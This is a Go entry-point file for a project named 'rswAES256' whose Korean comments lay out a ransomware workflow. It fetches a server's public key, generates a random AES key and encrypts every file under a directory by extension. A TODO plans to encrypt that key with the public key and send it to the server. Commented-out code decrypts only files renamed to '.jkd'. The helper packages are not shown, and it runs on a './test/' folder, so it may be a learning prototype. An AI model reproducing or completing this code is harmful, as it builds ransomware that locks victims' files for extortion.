package main

import (
	"flag"
	"fmt"
	"log"
	"rswAES256/client"
	"rswAES256/config"
)

var path = "./config.toml"

var pathFlag = flag.String("config", path, "set toml path")

func main() {
	flag.Parse()

	// 설정파일 설정.
	c := config.NewConfig(path)
	fmt.Println(c)

	newClient := client.NewClient(c)
	// 서버로부터 public key를 가져옴.
	publicKey, err := newClient.GetPublicKey()
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Println("PublicKey from server : ", *publicKey)

	//난수 키 생성.
	key := newClient.CreateRandomKey()
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Printf("Randome key : %x\n", key)

	// rootPath의 하위 파일들을 설정한 확장자에 따라 모두 암호화 함.
	err = newClient.AESEncryptDirectory("./test/")
	if err != nil {
		log.Fatalln(err)
	}

	//todo 공개키로 난수 키를 암호화 후 서버로 전달.

	// rootPath의 하위 파일들을 복호화(확장자가.jkd으로 암호화된것만 복호화)
	//err = newClient.AESDecryptDirectory("./test/")
	//if err != nil {
	//	log.Fatalln(err)
	//}

	// AES 암호화
	//cipherText, err := encrypt.EncryptAES(data, []byte(*key))
	//if err != nil {
	//	log.Fatalln(err)
	//}
	//fmt.Printf("cipherText : %x\n", cipherText)

	// 파일 암호화
	//err = encrypt.EncryptFile("./test.txt", []byte(*key))
	//if err != nil {
	//	log.Fatalln(err)
	//}

	// 파일 확장자 변경
	//err = newClient.ChangeFileExtension("./test.txt")
	//if err != nil {
	//	log.Fatalln(err)
	//}

	// 파일 복호화
	//err = decrypt.DecryptFile("./test/abc.go", []byte(*key))
	//if err != nil {
	//	log.Fatalln()
	//}

	//AES 복호화
	//plainText, err := decrypt.DecryptAES(cipherText, []byte(*key))
	//if err != nil {
	//	log.Fatalln(err)
	//}
	//fmt.Println("plainText : ", string(plainText))

}
